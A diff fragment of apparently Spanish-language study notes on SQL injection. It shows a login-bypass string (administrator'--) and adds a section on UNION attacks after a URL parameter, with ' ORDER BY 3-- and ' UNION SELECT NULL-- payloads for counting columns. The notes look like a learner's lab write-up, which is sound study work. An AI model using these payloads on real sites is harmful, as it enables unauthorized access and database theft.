@@ -22,6 +22,16 @@ Esto siguiente si lo pones en el logeo y pones cualquier contraseña podrás ent
 administrator'--
 
 
+## Ataques de UNION
+Eso debe de ser despues de una consulta algo así despues de la url ?category=Pets <- despues de eso
 
+Puedes realizarlos con esto, y vas subiendo el número para saber cuantas filas hay:
+' ORDER BY 3--
+
+Tambien se puede usar esto para saber de cuantas columnas hablamos:
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+etc.
 
 
